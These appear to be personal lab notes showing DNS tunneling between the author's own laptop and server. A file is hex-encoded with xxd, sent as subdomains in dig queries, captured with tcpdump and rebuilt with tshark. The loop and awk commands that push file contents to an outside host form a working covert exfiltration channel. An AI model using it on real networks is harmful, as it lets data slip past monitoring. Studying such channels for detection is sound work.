# DNS tunneling

## https://isc.sans.edu/diary/Packet+Tricks+with+xxd/10306/

Remote machine has IP 158.69.60.101 and domain name histfile.org.

On remote machine, we have BIND9 server. It only serves requests from localhost. We temporarily open port 53 to DNS requests, using socat:

```bash
sudo socat UDP4-LISTEN:53,fork,bind=158.69.60.101 UDP4:127.0.0.1:53 &
```

On remote machine, we capture traffic on port 53: [^tcpdump]

[^tcpdump]: <https://www.tcpdump.org/manpages/tcpdump.1.html> and <https://danielmiessler.com/blog/tcpdump>

```bash
sudo tcpdump -i any -w /tmp/dns_capture.pcap 'port 53'
```

```console
tcpdump: data link type LINUX_SLL2
tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
^C4 packets captured
6 packets received by filter
0 packets dropped by kernel
```

On local machine,

```bash
dig @histfile.org "$(echo 'my secret message' | xxd -p).covert.histfile.org"
```

```console
; <<>> DiG 9.18.39-0ubuntu0.24.04.2-Ubuntu <<>> @histfile.org 6d7920736563726574206d6573736167650a.covert.histfile.org
; (2 servers found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 1994
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 366f04e9f4c57f3b010000006933915aff1c6dcf45c4d48a (good)
;; QUESTION SECTION:
;6d7920736563726574206d6573736167650a.covert.histfile.org. IN A

;; AUTHORITY SECTION:
histfile.org.           796     IN      SOA     dilbert.ns.cloudflare.com. dns.cloudflare.com. 2389864202 10000 2400 604800 1800

;; Query time: 15 msec
;; SERVER: 158.69.60.101#53(histfile.org) (UDP)
;; WHEN: Fri Dec 05 21:13:47 EST 2025
;; MSG SIZE  rcvd: 204
```

On remote machine,

```bash
tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name \
| grep "covert.histfile.org" \
| sed 's/\.covert\.histfile\.org\.//' \
| uniq \
| xxd -r -p
```

```console
my secret message
```

Now we do the same for a multiline text line. First we make the file:

```bash
echo -e "first line\nsecond line\nthird line" > secret.txt
```

Then

```bash
xxd -p secret.txt > secret.hex
```

Now we transmit secret.hex

```bash
for b in $(cat secret.hex); do
  dig @histfile.org $b.covert.histfile.org
done
```

On the DNS server we cease the packet capturing and examine the captured packets

```bash
tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name \
| grep "covert.histfile.org" \
| sed 's/\.covert\.histfile\.org\.//' \
| uniq \
| xxd -r -p
```

```console
first line
second line
third line
```

## https://leonjza.github.io/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/

```console
ubuntu@histfile:~$ sudo tcpdump -i any -w /tmp/dns_capture.pcap 'port 53'
```

```console
ubuntu@laptop:~$ echo -e "line one\nline two\nline three" > message.txt
ubuntu@laptop:~$ cat message.txt
line one
line two
line three
```

```console
gzip -k message.txt
```

```console
ubuntu@laptop:~$ xxd -p message.txt.gz > message.hex
```

```console
ubuntu@laptop:~$ awk '{ print "dig " $1 ".fake.io @histfile.org +short" }' message.hex
dig 1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io @histfile.org +short
dig e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io @histfile.org +short
```



```console
ubuntu@histfile:~$ sudo tcpdump -i any -w /tmp/dns_capture.pcap 'port 53'
tcpdump: data link type LINUX_SLL2
tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
^C10 packets captured
15 packets received by filter
0 packets dropped by kernel
```


```console
ubuntu@histfile:~$ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name
1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
```


```console
ubuntu@histfile:~$ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name | cut -d '.' -f 1 | uniq
1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b
e5ca01314acaf3a18c8ca2d4542e002e188f571d000000
```

```console
ubuntu@histfile:~$ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name | cut -d '.' -f 1 | uniq > message.hex
```

```console
ubuntu@histfile:~$ xxd -p -r message.hex > message.txt.gz
```


```console
ubuntu@histfile:~$ gunzip message.txt.gz
```

```console
ubuntu@histfile:~$ cat message.txt
line one
line two
line three
```



